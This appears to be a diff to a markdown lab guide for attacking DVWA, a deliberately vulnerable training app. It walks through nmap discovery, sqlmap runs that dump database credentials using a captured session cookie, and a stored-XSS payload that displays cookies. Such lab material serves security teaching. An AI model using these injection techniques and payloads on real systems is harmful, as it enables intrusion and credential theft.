@@ -49,13 +49,13 @@ The goal of this lab is to compromise the DVWA database and execute malicious cl
 # Container name is 'dvwa-victim'
 nmap -sn dvwa victim
 ```
-2. **Install SQLMap***
+2. **Install SQLMap**:
 ```
 apt update && apt install sqlmap -y
 ```
 ### Phase 2: SQL Injection (SQLi) - Automated Database Compromise
 1. **Capture Cookies**: In the browser (while logged into DVWA), open **Developer Tools** (F12) and find the `PHPSESSID` cookie value under the **Application** or **Storage** tab and copy this value.
-2. **Run SQLMap to Dump Credentials:
+2. **Run SQLMap to Dump Credentials**:
 ```
 # Replace <Your_Session_ID> with the copied value
 sql map -u "http://dvwa-victim/vulnerabilities/sqli/?id=1&Submit=Submit" \
@@ -63,3 +63,13 @@ sql map -u "http://dvwa-victim/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ```
 Success is confirmed when SQLMap displays a table listing the usernames and hashed passwords from the database.
 ### Phase 3: Cross-Site Scripting (XSS) - Stored Payload
+1. **Navigate**: In the browser, go to the **"XSS (Stored)"** page.
+2. **Payload**: Use the following script in the **"Message"** field to demonstrate cookie theft/display:
+```
+<script>alert(document.cookie);</script>
+```
+3. **Observation**: An immediate JavaScript pop-up alert box should appear, displaying the current session cookies. This confirms the application is vulnerable to Stored XSS because it fails to sanitise user input.
+
+---
+
+## Conclusion
